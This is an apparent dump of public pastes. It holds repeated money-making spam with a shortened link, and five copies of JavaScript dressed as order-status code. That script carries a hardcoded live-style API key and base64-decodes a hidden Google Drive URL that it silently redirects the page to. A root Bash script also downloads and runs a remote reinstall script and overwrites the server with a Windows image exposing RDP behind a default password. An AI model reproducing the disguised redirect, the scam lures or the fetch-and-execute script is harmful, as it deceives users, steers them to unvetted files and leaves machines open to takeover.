id,title,username,language,date,content
RzcPi93T,EARN $900 INSTANTLY 2025 2U,iwantscript132421,JavaScript,Saturday 12th of April 2025 01:00:34 AM CDT," 
Pdf https://tinyurl.com/privguidee


5F2Jou6LNi
"
hz9zVZqd,Products.js,Epiphemeral,JavaScript,Saturday 12th of April 2025 12:53:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95765/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XmXSDXLa,Make $1000 15-MINUTES (BEGINNER) FM,iwantscript132421,JavaScript,Saturday 12th of April 2025 12:47:08 AM CDT," 
Pdf https://tinyurl.com/privguidee


eT4UABHTBV
"
u6erwfpr,Order.js,Epiphemeral,JavaScript,Saturday 12th of April 2025 12:37:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50209/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FQx1ayKL,EARN $900 INSTANTLY 2025⭐ G8,iwantscript132421,JavaScript,Saturday 12th of April 2025 12:33:44 AM CDT," 
Pdf https://tinyurl.com/privguidee


5GcAnKFKMt
"
kJAmpSGS,setRDP,ppek,Bash,Saturday 12th of April 2025 12:28:17 AM CDT,"#!/bin/bash
set -e  # Exit immediately if a command exits with a non-zero status

# Define color variables
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
NC='\e[0m' # No Color

# Check for root privileges
if [ ""$EUID"" -ne 0 ]; then
    echo -e ""${RED}This script must be run as root. Use 'sudo' to execute it.${NC}""
    exit 1
fi

# Function to prompt for OS selection
select_os() {
    while true; do
        echo -e ""${BLUE} KAJOKO BAIK HATI :${NC}""
        echo -e ""${YELLOW}1) Windows 10 GS DigitalOcean${NC}""
        echo -e ""${YELLOW}2) Windows 2016${NC}""
        echo -e ""${YELLOW}3) Windows 2012${NC}""
        read -p ""Enter choice : "" os_choice
        if [[ ""$os_choice"" =~ ^[1-3]$ ]]; then
            break
        else
            echo -e ""${RED}Invalid selection. Please enter 1 or 2.${NC}""
        fi
    done

    if [ ""$os_choice"" == ""1"" ]; then
        img_url='joko/win10.gz'
    elif [ ""$os_choice"" == ""2"" ]; then
        img_url='joko/win2016.gz'
    elif [ ""$os_choice"" == ""3"" ]; then
        img_url='https://www.dropbox.com/scl/fi/kc0v8uv9cca90kwxgftec/w2012r2.gz?rlkey=nf5cxoel30b4ax1yi33h0zhfv&st=uqfvhlw4&dl=1'
    fi
}

# Function to prompt for password
prompt_password() {
    default_password=""Warning1@""
    while true; do
        echo -e ""${GREEN}Enter RDP password (press enter for default: ${default_password}):${NC}""
        read -p """" user_password
        password=${user_password:-$default_password}
        break
        
        # Password strength check
#         if [[ ""$password"" =~ ^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).{8,}$ ]]; then
#             break
#         else
#             echo -e ""${RED}Password must be at least 8 characters long and include uppercase, lowercase, and numbers.${NC}""
#         fi
    done
}

# Download reinstall.sh
download_reinstall_script() {
    echo -e ""${BLUE}Downloading reinstall.sh...${NC}""
    if ! curl -# -O https://raw.githubusercontent.com/kripul/reinstall/main/reinstall.sh && ! wget --progress=bar:force -O reinstall.sh https://raw.githubusercontent.com/kripul/reinstall/main/reinstall.sh; then
        echo -e ""${RED}Failed to download reinstall.sh. Exiting.${NC}""
        exit 1
    fi
}

# Execute the reinstall script
execute_reinstall_script() {
    echo -e ""${GREEN}Executing reinstall script...${NC}""
    bash reinstall.sh dd \
         --rdp-port 6969 \
         --password ""$password"" \
         --img ""$img_url""
}

# Confirm reboot
confirm_reboot() {
    read -p ""Are you sure you want to reboot now? (y/n): "" confirm_reboot
    if [[ ""$confirm_reboot"" == ""y"" || ""$confirm_reboot"" == ""Y"" ]]; then
        echo -e ""${YELLOW}Rebooting in 5 seconds...${NC}""
        sleep 5
        reboot
    else
        echo -e ""${GREEN}Reboot canceled. Exiting.${NC}""
        exit 0
    fi
}

# Main script logic
select_os
prompt_password
download_reinstall_script
execute_reinstall_script
confirm_reboot"
Rxyd3Ajf,Market.js,Epiphemeral,JavaScript,Saturday 12th of April 2025 12:22:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79039/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xtFn5e8D,Make $1000 15-MINUTES  (BEGINNER) HV,iwantscript132421,JavaScript,Saturday 12th of April 2025 12:20:20 AM CDT," 
Pdf https://tinyurl.com/privguidee


klon3oRZMQ
"
bK7HHYSH,Untitled,Epiphemeral,JavaScript,Saturday 12th of April 2025 12:07:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56585/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BhZveSDa,EARN $900 INSTANTLY 2025 2U,iwantscript132421,JavaScript,Saturday 12th of April 2025 12:06:55 AM CDT," 
Pdf https://tinyurl.com/privguidee


eP2Lpy9b7E
"
